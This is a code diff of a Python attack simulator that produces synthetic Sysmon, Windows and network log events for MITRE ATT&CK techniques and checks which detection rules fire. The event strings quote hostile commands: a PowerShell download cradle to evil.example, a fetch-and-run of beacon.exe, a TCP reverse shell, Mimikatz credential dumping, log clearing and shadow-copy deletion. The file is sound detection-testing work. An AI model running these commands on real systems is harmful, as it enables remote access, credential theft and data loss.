@@ -11,6 +11,11 @@ Used for:
 Each "atomic test" simulates the *telemetry* an attack would produce,
 NOT the attack itself. This is safe to run on any machine.
 
+Events carry no detection labels. When a test runs, every event goes through
+the real detection pipeline (detection_pipeline.py) and only the rules that
+actually fire produce alerts. detection_validator.py runs the same replay in
+CI and fails if a technique stops being detected.
+
 Usage:
     python attack_simulator.py                    # Run all tests
     python attack_simulator.py --technique T1003  # Run specific technique
@@ -20,17 +25,14 @@ Usage:
 
 import os
 import sys
-import json
-import random
 import argparse
 import time
-import sqlite3
-from datetime import datetime, timedelta
-from collections import defaultdict
+from datetime import datetime
 
 # Add project root to path
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 from event_bus import EventBus
+from detection_pipeline import Detector, publish
 
 
 class AtomicTest:
@@ -55,6 +57,7 @@ class AttackSimulator:
 
     def __init__(self):
         self.bus = EventBus()
+        self.detector = Detector()
         self.tests = {}
         self.campaigns = {}
         self.results = []
@@ -62,7 +65,20 @@ class AttackSimulator:
         self._register_campaigns()
 
     def _register_all_tests(self):
-        """Register all available atomic tests."""
+        """
+        Register all available atomic tests.
+
+        Events are written the way the log source records them (Sysmon,
+        Security, PowerShell Operational, flow and DNS logs). They carry no
+        detection labels: which rules fire is decided by the real engines,
+        see detection_validator.py.
+        """
+        victim = "192.168.1.50"
+        c2 = "198.51.100.77"
+        ps = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+
+        def ev(source, severity, message, src_ip=victim):
+            return (source, severity, message, {"src_ip": src_ip})
 
         # ================================================================
         # T1003 - OS Credential Dumping (Mimikatz / LSASS)
@@ -71,36 +87,26 @@ class AttackSimulator:
             technique_id="T1003",
             technique_name="OS Credential Dumping",
             tactic="Credential Access",
-            description="Simulates Mimikatz-style LSASS memory access for credential extraction.",
-            expected_rules=["Malware Signature Match", "Suspicious PowerShell Execution"],
+            expected_rules=[
+                "LSASS Credential Access",
+                "SIGMA: LSASS Memory Access - Credential Dumping",
+            ],
+            description="Simulates Mimikatz opening LSASS memory to extract credentials.",
             severity="CRITICAL",
             events=[
-                ("Windows_EventLog", "CRITICAL",
-                 "Process access to LSASS.exe detected. Source: mimikatz.exe (PID 4402) "
-                 "requested PROCESS_VM_READ on lsass.exe (PID 672). "
-                 "GrantedAccess: 0x1010. User: CORP\\admin",
-                 {"src_ip": "192.168.1.50", "rule_matched": "Credential Dumping",
-                  "mitre_id": "T1003", "mitre_tactic": "Credential Access",
-                  "threat_score": 95}),
-                ("Windows_Sysmon", "CRITICAL",
-                 "Event ID 10: ProcessAccess. SourceImage: C:\\Users\\admin\\Downloads\\mimikatz.exe "
-                 "TargetImage: C:\\Windows\\System32\\lsass.exe "
-                 "CallTrace: ntdll.dll!NtReadVirtualMemory",
-                 {"src_ip": "192.168.1.50", "rule_matched": "LSASS Access",
-                  "mitre_id": "T1003", "mitre_tactic": "Credential Access",
-                  "threat_score": 98}),
-                ("Windows_EventLog", "HIGH",
-                 "Event ID 4672: Special privileges assigned to new logon. "
-                 "Subject: CORP\\admin. Privileges: SeDebugPrivilege",
-                 {"src_ip": "192.168.1.50", "rule_matched": "Privilege Escalation",
-                  "mitre_id": "T1003", "mitre_tactic": "Credential Access",
-                  "threat_score": 75}),
-                ("Windows_PowerShell", "CRITICAL",
-                 "PowerShell ScriptBlock logging: Invoke-Mimikatz -Command "
-                 "'sekurlsa::logonpasswords' | Out-File C:\\temp\\creds.txt",
-                 {"src_ip": "192.168.1.50", "rule_matched": "Suspicious PowerShell",
-                  "mitre_id": "T1003", "mitre_tactic": "Credential Access",
-                  "threat_score": 99}),
+                ev("Windows_EventLog", "HIGH",
+                   "Event ID 4672: Special privileges assigned to new logon. "
+                   "Subject: CORP\\admin. Privileges: SeDebugPrivilege"),
+                ev("Windows_Sysmon", "CRITICAL",
+                   "Event ID 10: Process accessed. "
+                   "SourceImage: C:\\Users\\admin\\Downloads\\mimikatz.exe. SourceProcessId: 4402. "
+                   "TargetImage: C:\\Windows\\System32\\lsass.exe. TargetProcessId: 672. "
+                   "GrantedAccess: 0x1010. CallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9d4c4. "
+                   "SourceUser: CORP\\admin"),
+                ev("Windows_PowerShell", "CRITICAL",
+                   "Event ID 4104: Creating Scriptblock text. "
+                   "ScriptBlockText: Invoke-Mimikatz -Command 'sekurlsa::logonpasswords' "
+                   "| Out-File C:\\temp\\creds.txt"),
             ],
         )
 
@@ -108,34 +114,28 @@ class AttackSimulator:
         # T1110 - Brute Force
         # ================================================================
         attacker_ip = "203.0.113.42"
-        brute_events = []
-        for i in range(12):
-            brute_events.append((
-                "Windows_EventLog", "MEDIUM",
-                f"Event ID 4625: An account failed to log on. "
-                f"Subject: NT AUTHORITY\\SYSTEM. Target: CORP\\administrator. "
-                f"Logon Type: 10 (RemoteInteractive). Source IP: {attacker_ip}. "
-                f"Failure Reason: Unknown user name or bad password. Attempt {i+1}",
-                {"src_ip": attacker_ip, "mitre_id": "T1110",
-                 "mitre_tactic": "Credential Access", "threat_score": 40 + i * 3,
-                 "geo_country": "RU", "geo_city": "Moscow"},
-            ))
-        # Successful login after brute force
-        brute_events.append((
-            "Windows_EventLog", "CRITICAL",
-            f"Event ID 4624: An account was successfully logged on. "
-            f"Subject: CORP\\administrator. Logon Type: 10 (RemoteInteractive). "
-            f"Source IP: {attacker_ip}. After 12 failed attempts.",
-            {"src_ip": attacker_ip, "rule_matched": "Brute Force - Successful",
-             "mitre_id": "T1110", "mitre_tactic": "Credential Access",
-             "threat_score": 90, "geo_country": "RU", "geo_city": "Moscow"},
-        ))
+        brute_events = [
+            ev("Windows_EventLog", "MEDIUM",
+               "Event ID 4625: An account failed to log on. "
+               "Subject: NT AUTHORITY\\SYSTEM. Target: CORP\\administrator. "
+               f"Logon Type: 10. Source Network Address: {attacker_ip}. "
+               "Failure Reason: Unknown user name or bad password",
+               src_ip=attacker_ip)
+            for _ in range(12)
+        ]
+        brute_events.append(
+            ev("Windows_EventLog", "INFO",
+               "Event ID 4624: An account was successfully logged on. "
+               f"Target: CORP\\administrator. Logon Type: 10. Source Network Address: {attacker_ip}",
+               src_ip=attacker_ip))
         self.tests["T1110"] = AtomicTest(
             technique_id="T1110",
             technique_name="Brute Force",
             tactic="Credential Access",
-            description="Simulates 12 failed RDP login attempts followed by a successful breach.",
-            expected_rules=["Brute Force Detection"],
+            expected_rules=[
+                "Brute Force Detection",
+            ],
+            description="Simulates 12 failed RDP logons from one address followed by a success.",
             severity="HIGH",
             events=brute_events,
         )
@@ -147,62 +147,55 @@ class AttackSimulator:
             technique_id="T1059.001",
             technique_name="PowerShell",
             tactic="Execution",
-            description="Simulates malicious PowerShell with encoded commands and download cradle.",
-            expected_rules=["Reverse Shell Indicator", "Suspicious PowerShell Execution"],
+            expected_rules=[
+                "PowerShell Download Cradle",
+                "SIGMA: Encoded PowerShell Command - Base64",
+                "SIGMA: Suspicious PowerShell Execution",
+            ],
+            description="Simulates a PowerShell download cradle and an encoded, hidden PowerShell launch.",
             severity="CRITICAL",
             events=[
-                ("Windows_PowerShell", "CRITICAL",
-                 "PowerShell ScriptBlock ID 0xAB12: "
-                 "IEX(New-Object Net.WebClient).downloadstring('http://evil.com/payload.ps1') "
-                 "| Invoke-Expression",
-                 {"src_ip": "192.168.1.50", "rule_matched": "PowerShell Download Cradle",
-                  "mitre_id": "T1059.001", "mitre_tactic": "Execution",
-                  "threat_score": 92}),
-                ("Windows_Sysmon", "HIGH",
-                 "Event ID 1: Process Create. Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe "
-                 "CommandLine: powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAKABOAGUAdwA= "
-                 "ParentImage: C:\\Windows\\System32\\cmd.exe User: CORP\\jsmith",
-                 {"src_ip": "192.168.1.50", "rule_matched": "Encoded PowerShell",
-                  "mitre_id": "T1059.001", "mitre_tactic": "Execution",
-                  "threat_score": 88}),
-                ("Windows_PowerShell", "HIGH",
-                 "PowerShell Module logging: Invoke-WebRequest -Uri 'http://203.0.113.99/beacon.exe' "
-                 "-OutFile 'C:\\Users\\Public\\svchost.exe'; "
-                 "Start-Process 'C:\\Users\\Public\\svchost.exe' -WindowStyle Hidden",
-                 {"src_ip": "192.168.1.50", "rule_matched": "Suspicious Download",
-                  "mitre_id": "T1059.001", "mitre_tactic": "Execution",
-                  "threat_score": 85}),
+                ev("Windows_PowerShell", "HIGH",
+                   "Event ID 4104: Creating Scriptblock text. ScriptBlockText: "
+                   "IEX(New-Object Net.WebClient).downloadstring('http://evil.example/payload.ps1')"),
+                ev("Windows_Sysmon", "HIGH",
+                   f"Event ID 1: Process Create. Image: {ps} "
+                   "CommandLine: powershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient)"
+                   ".DownloadString('http://evil.example/payload.ps1')\" "
+                   "ParentImage: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE "
+                   "User: CORP\\jsmith"),
+                ev("Windows_Sysmon", "HIGH",
+                   f"Event ID 1: Process Create. Image: {ps} "
+                   "CommandLine: powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAKABOAGUAdwA= "
+                   "ParentImage: C:\\Windows\\System32\\cmd.exe User: CORP\\jsmith"),
+                ev("Windows_PowerShell", "HIGH",
+                   "Event ID 4104: Creating Scriptblock text. ScriptBlockText: "
+                   "Invoke-WebRequest -Uri 'http://203.0.113.99/beacon.exe' "
+                   "-OutFile 'C:\\Users\\Public\\svchost.exe'; "
+                   "Start-Process 'C:\\Users\\Public\\svchost.exe' -WindowStyle Hidden"),
             ],
         )
 
         # ================================================================
         # T1046 - Network Service Scanning
         # ================================================================
-        target_ips = ["10.0.0.1", "10.0.0.2", "10.0.0.5", "10.0.0.10", "10.0.0.20"]
-        scan_events = []
-        for target in target_ips:
-            for port in [22, 80, 443, 445, 3389, 8080, 8443]:
-                scan_events.append((
-                    "Network_IPS", "LOW",
-                    f"SYN scan detected: 192.168.1.100 -> {target}:{port} "
-                    f"(connection attempt, no response)",
-                    {"src_ip": "192.168.1.100", "mitre_id": "T1046",
-                     "mitre_tactic": "Discovery", "threat_score": 15},
-                ))
-        # Summary event
-        scan_events.append((
-            "Network_IPS", "MEDIUM",
-            f"Port scan summary: 192.168.1.100 scanned 35 ports across 5 hosts in 8 seconds. "
-            f"Open ports found: 10.0.0.1:22, 10.0.0.1:80, 10.0.0.5:445, 10.0.0.10:3389",
-            {"src_ip": "192.168.1.100", "rule_matched": "Port Scan Detection",
-             "mitre_id": "T1046", "mitre_tactic": "Discovery", "threat_score": 55},
-        ))
+        scanner = "192.168.1.100"
+        scan_events = [
+            ev("Network_Flow", "INFO",
+               f"Connection: SrcIp: {scanner}. DstIp: {target}. DstPort: {port}. "
+               "Protocol: TCP. Flags: S. Reply: none",
+               src_ip=scanner)
+            for target in ["10.0.0.1", "10.0.0.2", "10.0.0.5", "10.0.0.10", "10.0.0.20"]
+            for port in [22, 80, 443, 445, 3389, 8080, 8443]
+        ]
         self.tests["T1046"] = AtomicTest(
             technique_id="T1046",
             technique_name="Network Service Scanning",
             tactic="Discovery",
-            description="Simulates Nmap-style SYN scan across 5 internal hosts on common ports.",
-            expected_rules=["Port Scan Detection"],
+            expected_rules=[
+                "Port Scan Detection",
+            ],
+            description="Simulates an Nmap-style SYN scan of 7 ports on 5 internal hosts.",
             severity="MEDIUM",
             events=scan_events,
         )
@@ -214,24 +207,20 @@ class AttackSimulator:
             technique_id="T1070.001",
             technique_name="Clear Windows Event Logs",
             tactic="Defense Evasion",
-            description="Simulates an attacker clearing Security event logs to cover tracks.",
-            expected_rules=["Log Tampering", "Clearing Windows Event Logs"],
+            expected_rules=[
+                "Log Tampering",
+                "SIGMA: Clearing Windows Event Logs",
+            ],
+            description="Simulates an attacker clearing the Security log with wevtutil.",
             severity="CRITICAL",
             events=[
-                ("Windows_EventLog", "CRITICAL",
-                 "Event ID 1102: The audit log was cleared. "
-                 "Subject: CORP\\compromised_admin. "
-                 "LogName: Security. This action was performed by wevtutil.exe",
-                 {"src_ip": "192.168.1.50", "rule_matched": "Log Tampering",
-                  "mitre_id": "T1070.001", "mitre_tactic": "Defense Evasion",
-                  "threat_score": 97}),
-                ("Windows_Sysmon", "HIGH",
-                 "Event ID 1: Process Create. Image: C:\\Windows\\System32\\wevtutil.exe "
-                 "CommandLine: wevtutil cl Security "
-                 "ParentImage: C:\\Windows\\System32\\cmd.exe User: CORP\\compromised_admin",
-                 {"src_ip": "192.168.1.50", "rule_matched": "Event Log Manipulation",
-                  "mitre_id": "T1070.001", "mitre_tactic": "Defense Evasion",
-                  "threat_score": 85}),
+                ev("Windows_Sysmon", "HIGH",
+                   "Event ID 1: Process Create. Image: C:\\Windows\\System32\\wevtutil.exe "
+                   "CommandLine: wevtutil cl Security "
+                   "ParentImage: C:\\Windows\\System32\\cmd.exe User: CORP\\compromised_admin"),
+                ev("Windows_EventLog", "CRITICAL",
+                   "Event ID 1102: The audit log was cleared. "
+                   "Subject: CORP\\compromised_admin"),
             ],
         )
 
@@ -242,27 +231,24 @@ class AttackSimulator:
             technique_id="T1543.003",
             technique_name="Windows Service Persistence",
             tactic="Persistence",
-            description="Simulates a malicious service installation for persistence.",
-            expected_rules=["Suspicious Service Installation"],
+            expected_rules=[
+                "SIGMA: Service Installed From a Suspicious Path",
+                "Suspicious Service Installation",
+            ],
+            description="Simulates installing a service that runs a binary from ProgramData.",
             severity="HIGH",
             events=[
-                ("Windows_EventLog", "HIGH",
-                 "Event ID 7045: A service was installed in the system. "
-                 "Service Name: WindowsUpdateHelper. "
-                 "Service File Name: C:\\ProgramData\\svchost.exe -k netsvcs. "
-                 "Service Type: user mode service. Service Start Type: auto start. "
-                 "Account: LocalSystem",
-                 {"src_ip": "192.168.1.50", "rule_matched": "Suspicious Service Install",
-                  "mitre_id": "T1543.003", "mitre_tactic": "Persistence",
-                  "threat_score": 80}),
-                ("Windows_Sysmon", "HIGH",
-                 "Event ID 1: Process Create. Image: C:\\Windows\\System32\\sc.exe "
-                 "CommandLine: sc create WindowsUpdateHelper binPath= "
-                 "\"C:\\ProgramData\\svchost.exe -k netsvcs\" start= auto "
-                 "User: CORP\\compromised_admin",
-                 {"src_ip": "192.168.1.50", "rule_matched": "Service Creation via SC",
-                  "mitre_id": "T1543.003", "mitre_tactic": "Persistence",
-                  "threat_score": 78}),
+                ev("Windows_Sysmon", "HIGH",
+                   "Event ID 1: Process Create. Image: C:\\Windows\\System32\\sc.exe "
+                   "CommandLine: sc create WindowsUpdateHelper binPath= "
+                   "\"C:\\ProgramData\\svchost.exe -k netsvcs\" start= auto "
+                   "User: CORP\\compromised_admin"),
+                ev("Windows_EventLog", "HIGH",
+                   "Event ID 7045: A service was installed in the system. "
+                   "Service Name: WindowsUpdateHelper. "
+                   "Service File Name: C:\\ProgramData\\svchost.exe -k netsvcs. "
+                   "Service Type: user mode service. Service Start Type: auto start. "
+                   "Service Account: LocalSystem"),
             ],
         )
 
@@ -273,23 +259,41 @@ class AttackSimulator:
             technique_id="T1041",
             technique_name="Exfiltration Over C2 Channel",
             tactic="Exfiltration",
-            description="Simulates large data transfer to external C2 server.",
-            expected_rules=["Data Exfiltration Indicator"],
+            expected_rules=[
+                "Data Exfiltration Indicator",
+            ],
+            description="Simulates 847 MB leaving one workstation over HTTPS to an external host.",
             severity="CRITICAL",
             events=[
-                ("Network_IPS", "HIGH",
-                 "Large outbound transfer detected: 192.168.1.50 -> 198.51.100.77:443 "
-                 "transferred 847 MB in 12 minutes. Protocol: HTTPS. "
-                 "Normal baseline for this host: 50 MB/day",
-                 {"src_ip": "192.168.1.50", "rule_matched": "Data Exfiltration",
-                  "mitre_id": "T1041", "mitre_tactic": "Exfiltration",
-                  "threat_score": 88, "geo_country": "CN", "geo_city": "Shanghai"}),
-                ("Network_IPS", "MEDIUM",
-                 "DNS query volume anomaly: 192.168.1.50 made 2,847 DNS queries in 10 minutes "
-                 "to subdomain pattern: *.data.evil-domain.com (possible DNS exfiltration)",
-                 {"src_ip": "192.168.1.50", "rule_matched": "DNS Exfiltration",
-                  "mitre_id": "T1041", "mitre_tactic": "Exfiltration",
-                  "threat_score": 75}),
+                ev("Network_Flow", "INFO",
+                   f"Flow end: SrcIp: {victim}. DstIp: {c2}. DstPort: 443. Protocol: TCP. "
+                   "BytesOut: 888143872. BytesIn: 1048576. Duration: 720"),
+            ],
+        )
+
+        # ================================================================
+        # T1048.003 - Exfiltration Over Unencrypted Non-C2 Protocol (DNS)
+        # ================================================================
+        chunks = [
+            "U0VDUkVUOnBheXJvbGwtMjAyNi5jc3YgY2h1bmsgMDEgb2YgMzA",
+            "bmFtZSxzc24sc2FsYXJ5LGJhbmtfYWNjb3VudCxyb3V0aW5nX24",
+            "YWxpY2UsMDAwLTAwLTAwMDAsOTUwMDAsMDAwMDAwMDAwLDAwMDA",
+        ]
+        self.tests["T1048.003"] = AtomicTest(
+            technique_id="T1048.003",
+            technique_name="Exfiltration Over Alternative Protocol: DNS",
+            tactic="Exfiltration",
+            expected_rules=[
+                "DNS Exfiltration",
+                "SIGMA: DNS Query With an Encoded Label",
+            ],
+            description="Simulates a file leaving in base64 chunks packed into DNS query names.",
+            severity="HIGH",
+            events=[
+                ev("Network_DNS", "INFO",
+                   f"DNS query: SrcIp: {victim}. QueryName: {chunks[i % 3]}{i:02d}.data.evil-domain.example. "
+                   "QueryType: TXT")
+                for i in range(12)
             ],
         )
 
@@ -300,25 +304,21 @@ class AttackSimulator:
             technique_id="T1059",
             technique_name="Command and Scripting Interpreter",
             tactic="Execution",
-            description="Simulates reverse shell establishment via PowerShell.",
-            expected_rules=["Reverse Shell Indicator"],
+            expected_rules=[
+                "Reverse Shell Indicator",
+                "SIGMA: Reverse Shell Command Patterns",
+            ],
+            description="Simulates a PowerShell TCP reverse shell to port 4444.",
             severity="CRITICAL",
             events=[
-                ("Windows_Sysmon", "CRITICAL",
-                 "Event ID 1: Process Create. Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe "
-                 "CommandLine: powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient"
-                 "('198.51.100.77',4444);$stream = $client.GetStream();\" "
-                 "ParentImage: C:\\Windows\\System32\\cmd.exe User: CORP\\jsmith",
-                 {"src_ip": "192.168.1.50", "rule_matched": "Reverse Shell",
-                  "mitre_id": "T1059", "mitre_tactic": "Execution",
-                  "threat_score": 99}),
-                ("Network_IPS", "CRITICAL",
-                 "Outbound connection to known C2: 192.168.1.50 -> 198.51.100.77:4444 "
-                 "Protocol: TCP. Connection type: reverse shell pattern (interactive TTY). "
-                 "Threat intel match: IP flagged by AbuseIPDB (confidence: 97%)",
-                 {"src_ip": "198.51.100.77", "rule_matched": "C2 Communication",
-                  "mitre_id": "T1059", "mitre_tactic": "Execution",
-                  "threat_score": 97, "geo_country": "RU", "geo_city": "Saint Petersburg"}),
+                ev("Windows_Sysmon", "CRITICAL",
+                   f"Event ID 1: Process Create. Image: {ps} "
+                   "CommandLine: powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient"
+                   f"('{c2}',4444);$stream = $client.GetStream();\" "
+                   "ParentImage: C:\\Windows\\System32\\cmd.exe User: CORP\\jsmith"),
+                ev("Network_Flow", "INFO",
+                   f"Connection: SrcIp: {victim}. DstIp: {c2}. DstPort: 4444. "
+                   "Protocol: TCP. Flags: SA. Reply: established"),
             ],
         )
 
@@ -329,33 +329,18 @@ class AttackSimulator:
             technique_id="T1558.003",
             technique_name="Kerberoasting",
             tactic="Credential Access",
-            description="Simulates Kerberoasting attack requesting RC4-encrypted service tickets.",
-            expected_rules=["Kerberoasting Detection"],
+            expected_rules=[
+                "Kerberoasting Detection",
+                "SIGMA: Kerberoasting - RC4 Service Ticket Request",
+            ],
+            description="Simulates one user requesting RC4 service tickets for three SPNs.",
             severity="HIGH",
             events=[
-                ("Windows_EventLog", "HIGH",
-                 "Event ID 4769: A Kerberos service ticket was requested. "
-                 "Account: CORP\\jsmith. Service: MSSQLSvc/sql01.corp.local:1433. "
-                 "Ticket Encryption: 0x17 (RC4-HMAC). Client Address: 192.168.1.50. "
-                 "This encryption type is deprecated and commonly abused.",
-                 {"src_ip": "192.168.1.50", "rule_matched": "Kerberoasting",
-                  "mitre_id": "T1558.003", "mitre_tactic": "Credential Access",
-                  "threat_score": 82}),
-                ("Windows_EventLog", "HIGH",
-                 "Event ID 4769: A Kerberos service ticket was requested. "
-                 "Account: CORP\\jsmith. Service: HTTP/web01.corp.local. "
-                 "Ticket Encryption: 0x17 (RC4-HMAC). Client Address: 192.168.1.50",
-                 {"src_ip": "192.168.1.50", "rule_matched": "Kerberoasting",
-                  "mitre_id": "T1558.003", "mitre_tactic": "Credential Access",
-                  "threat_score": 82}),
-                ("Windows_EventLog", "HIGH",
-                 "Event ID 4769: A Kerberos service ticket was requested. "
-                 "Account: CORP\\jsmith. Service: CIFS/file01.corp.local. "
-                 "Ticket Encryption: 0x17 (RC4-HMAC). Client Address: 192.168.1.50. "
-                 "3 RC4 service ticket requests from same user in 30 seconds - anomalous",
-                 {"src_ip": "192.168.1.50", "rule_matched": "Kerberoasting",
-                  "mitre_id": "T1558.003", "mitre_tactic": "Credential Access",
-                  "threat_score": 90}),
+                ev("Windows_EventLog", "INFO",
+                   "Event ID 4769: A Kerberos service ticket was requested. "
+                   f"Account Name: jsmith@CORP.LOCAL. Service Name: {spn}. "
+                   f"Ticket Options: 0x40810000. Ticket Encryption Type: 0x17. Client Address: {victim}")
+                for spn in ["svc_sql", "svc_web", "svc_backup"]
             ],
         )
 
@@ -366,60 +351,49 @@ class AttackSimulator:
             technique_id="T1021.001",
             technique_name="Remote Desktop Protocol",
             tactic="Lateral Movement",
-            description="Simulates lateral movement via RDP from a compromised workstation.",
-            expected_rules=["Unauthorized Access Attempt"],
+            expected_rules=[
+                "RDP Lateral Movement",
+            ],
+            description="Simulates one workstation opening RDP sessions to two servers.",
             severity="HIGH",
             events=[
-                ("Windows_EventLog", "MEDIUM",
-                 "Event ID 4624: Logon Type 10 (RemoteInteractive). "
-                 "Account: CORP\\compromised_admin. Source IP: 192.168.1.50. "
-                 "Target: DC01.corp.local. Anomaly: This account has never used RDP before.",
-                 {"src_ip": "192.168.1.50", "rule_matched": "Anomalous RDP Login",
-                  "mitre_id": "T1021.001", "mitre_tactic": "Lateral Movement",
-                  "threat_score": 65}),
-                ("Windows_EventLog", "HIGH",
-                 "Event ID 4624: Logon Type 10 (RemoteInteractive). "
-                 "Account: CORP\\compromised_admin. Source IP: 192.168.1.50. "
-                 "Target: FILE01.corp.local. Second RDP session from same host in 5 minutes.",
-                 {"src_ip": "192.168.1.50", "rule_matched": "Lateral Movement",
-                  "mitre_id": "T1021.001", "mitre_tactic": "Lateral Movement",
-                  "threat_score": 78}),
+                ev("Windows_EventLog", "INFO",
+                   "Event ID 4624: An account was successfully logged on. "
+                   f"Target: CORP\\compromised_admin. Logon Type: 10. Source Network Address: {victim}. "
+                   f"Workstation Name: {host}")
+                for host in ["DC01", "FILE01"]
             ],
         )
 
         # ================================================================
         # T1486 - Data Encrypted for Impact (Ransomware)
         # ================================================================
+        ransom_proc = "C:\\ProgramData\\svchost.exe"
+        docs = "C:\\Users\\Public\\Documents"
         self.tests["T1486"] = AtomicTest(
             technique_id="T1486",
             technique_name="Data Encrypted for Impact",
             tactic="Impact",
-            description="Simulates ransomware file encryption activity and ransom note creation.",
-            expected_rules=["Malware Signature Match"],
+            expected_rules=[
+                "Ransomware File Encryption",
+                "SIGMA: Ransomware File Encryption Activity",
+            ],
+            description="Simulates shadow copy deletion, files rewritten as .encrypted, and a ransom note.",
             severity="CRITICAL",
             events=[
-                ("FileMonitor", "CRITICAL",
-                 "Rapid file modification detected: 847 files renamed with .encrypted extension "
-                 "in C:\\Users\\Public\\Documents\\ within 45 seconds. "
-                 "Process: C:\\ProgramData\\svchost.exe (PID 6612). "
-                 "This matches ransomware encryption behavior.",
-                 {"src_ip": "192.168.1.50", "rule_matched": "Ransomware Activity",
-                  "mitre_id": "T1486", "mitre_tactic": "Impact",
-                  "threat_score": 99}),
-                ("FileMonitor", "CRITICAL",
-                 "Ransom note created: C:\\Users\\Public\\Documents\\README_DECRYPT.txt. "
-                 "Content preview: 'Your files have been encrypted. Send 2 BTC to...' "
-                 "Process: C:\\ProgramData\\svchost.exe (PID 6612)",
-                 {"src_ip": "192.168.1.50", "rule_matched": "Ransomware Note",
-                  "mitre_id": "T1486", "mitre_tactic": "Impact",
-                  "threat_score": 100}),
-                ("Windows_EventLog", "CRITICAL",
-                 "Volume Shadow Copy deleted: vssadmin delete shadows /all /quiet. "
-                 "User: CORP\\compromised_admin. "
-                 "Shadow copy deletion prevents file recovery.",
-                 {"src_ip": "192.168.1.50", "rule_matched": "Shadow Copy Deletion",
-                  "mitre_id": "T1486", "mitre_tactic": "Impact",
-                  "threat_score": 95}),
+                ev("Windows_Sysmon", "HIGH",
+                   "Event ID 1: Process Create. Image: C:\\Windows\\System32\\vssadmin.exe "
+                   "CommandLine: vssadmin delete shadows /all /quiet "
+                   f"ParentImage: {ransom_proc} User: CORP\\compromised_admin"),
+            ] + [
+                ev("Windows_Sysmon", "INFO",
+                   f"Event ID 11: File created. Image: {ransom_proc} "
+                   f"TargetFilename: {docs}\\{name}.encrypted")
+                for name in ["Q3-forecast.xlsx", "payroll.csv", "contract.docx", "board-deck.pptx"]
+            ] + [
+                ev("Windows_Sysmon", "INFO",
+                   f"Event ID 11: File created. Image: {ransom_proc} "
+                   f"TargetFilename: {docs}\\README_DECRYPT.txt"),
             ],
         )
 
@@ -471,6 +445,7 @@ class AttackSimulator:
             "techniques": [
                 "T1046",        # Network scanning
                 "T1041",        # Data exfiltration
+                "T1048.003",    # DNS exfiltration
                 "T1070.001",    # Clear logs
             ],
         }
@@ -499,8 +474,10 @@ class AttackSimulator:
         print(f"  {'='*60}")
 
         events_emitted = 0
+        rules_fired = set()
         for source, severity, message, enrichment in test.events:
-            self.bus.emit(source, severity, message, enrichment=enrichment)
+            for match in publish(self.bus, self.detector, source, severity, message, enrichment):
+                rules_fired.add(match["rule_name"])
             events_emitted += 1
             if delay > 0:
                 time.sleep(delay)
@@ -511,6 +488,7 @@ class AttackSimulator:
             "tactic": test.tactic,
             "events_emitted": events_emitted,
             "expected_rules": test.expected_rules,
+            "rules_fired": sorted(rules_fired),
             "severity": test.severity,
             "timestamp": datetime.now().isoformat(),
             "status": "COMPLETED",
@@ -518,6 +496,7 @@ class AttackSimulator:
 
         self.results.append(result)
         print(f"  [+] Emitted {events_emitted} events for {test.technique_id}")
+        print(f"  [+] Rules fired: {', '.join(sorted(rules_fired)) or 'none'}")
         return result
 
     def run_campaign(self, campaign_id, delay=0.5):
@@ -595,50 +574,19 @@ class AttackSimulator:
 
     def get_detection_coverage(self):
         """
-        Analyze which tests were detected by existing rules.
-        Returns a coverage report.
+        Replay every atomic test through the real detection engines and report
+        which techniques are caught. See detection_validator.py.
         """
-        db_path = os.path.join(os.path.dirname(os.path.abspath(__file__)),
-                               "database", "guardian_events.db")
-        if not os.path.isfile(db_path):
-            return {"error": "No events database found. Run tests first."}
+        from detection_validator import validate_techniques
 
-        conn = sqlite3.connect(db_path)
-        conn.row_factory = sqlite3.Row
-
-        coverage = []
-        for tid, test in sorted(self.tests.items()):
-            # Check how many events for this technique have rule matches
-            rows = conn.execute(
-                "SELECT COUNT(*) as total, "
-                "SUM(CASE WHEN rule_matched != '' THEN 1 ELSE 0 END) as detected "
-                "FROM events WHERE mitre_id = ?",
-                (test.technique_id,)
-            ).fetchone()
-
-            total = rows["total"] if rows else 0
-            detected = rows["detected"] if rows else 0
-
-            coverage.append({
-                "technique_id": test.technique_id,
-                "technique_name": test.technique_name,
-                "tactic": test.tactic,
-                "events_total": total,
-                "events_detected": detected,
-                "coverage_pct": round(detected / total * 100, 1) if total > 0 else 0,
-                "status": "DETECTED" if detected > 0 else "GAP",
-                "expected_rules": test.expected_rules,
-            })
-
-        conn.close()
-
-        detected_count = sum(1 for c in coverage if c["status"] == "DETECTED")
+        techniques = validate_techniques(self)
+        detected_count = sum(1 for t in techniques if t["status"] == "DETECTED")
         return {
-            "total_techniques": len(coverage),
+            "total_techniques": len(techniques),
             "detected": detected_count,
-            "gaps": len(coverage) - detected_count,
-            "overall_coverage": round(detected_count / len(coverage) * 100, 1) if coverage else 0,
-            "techniques": coverage,
+            "gaps": len(techniques) - detected_count,
+            "overall_coverage": round(detected_count / len(techniques) * 100, 1) if techniques else 0,
+            "techniques": techniques,
         }
 
 
@@ -688,11 +636,12 @@ Examples:
             print(f"  Detected:         {report['detected']}")
             print(f"  Gaps:             {report['gaps']}")
             print(f"  Coverage:         {report['overall_coverage']}%")
-            print(f"\n  {'Technique':<15} {'Name':<30} {'Status':<10} {'Coverage'}")
-            print(f"  {'-'*15} {'-'*30} {'-'*10} {'-'*10}")
+            print(f"\n  {'Technique':<15} {'Name':<45} {'Status':<8} Detected by")
+            print(f"  {'-'*15} {'-'*45} {'-'*8} {'-'*30}")
             for t in report["techniques"]:
                 status_icon = "PASS" if t["status"] == "DETECTED" else "FAIL"
-                print(f"  {t['technique_id']:<15} {t['technique_name']:<30} {status_icon:<10} {t['coverage_pct']}%")
+                print(f"  {t['technique_id']:<15} {t['technique_name']:<45} {status_icon:<8} "
+                      f"{', '.join(t['detected_by']) or '-'}")
     elif args.all:
         sim.run_all_tests(delay=args.delay)
         print("\n  Run --coverage to see detection results.")
